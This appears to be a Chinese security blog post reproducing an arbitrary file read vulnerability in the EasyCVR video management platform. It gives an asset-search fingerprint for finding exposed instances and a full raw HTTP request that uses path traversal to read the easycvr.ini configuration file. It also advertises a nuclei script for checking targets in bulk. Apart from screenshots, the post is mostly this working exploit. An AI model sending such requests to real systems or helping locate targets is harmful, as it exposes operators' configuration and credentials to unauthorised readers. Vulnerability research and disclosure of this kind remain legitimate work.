#  【漏洞复现】EasyCVR视频管理平台存在任意文件读取漏洞   
 新势界NewFrontier   2025-01-07 02:03  
  
![](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.2500397116661788&random=0.331463449447553&random=0.8263159340656969 "")  
  
声明  
  
 该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。公众号现在只对常读和星标的公众号才展示大图推送，建议把公众号设为星标，否则可能就看不到啦！感谢各位师傅。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818 "")  
  
资产收集  
```
web.similar_icon=="11435736462193662542"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j9156dZMqCHDibALfXwgfQG8UZHvIeXqNUKGUEWSRlp3duAjozXgSnhMg8ub5Wh9iboAbtZK7iaunywYBQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640? "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j9156dZMqCHDibALfXwgfQG8UZW9hkibeOlFIW1ibYr88Z2iaEooA4KFemV11C7BLG6Fjl4aM4WeNtkFXMg/640?wx_fmt=png&from=appmsg "")  
  
发送请求  
```
GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j9156dZMqCHDibALfXwgfQG8UZkvicJQmeZB06CPAvwTNaokLpiaSQ1jNU00GtibGXD6icF2iaL4IjRfO2xpQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818 "")  
  
批量验证脚本  
  
关注公众号  
并回复   
“ZH-2025-01-07-001  
”  
 即可获得该漏洞nuclei脚本  
  
  
  
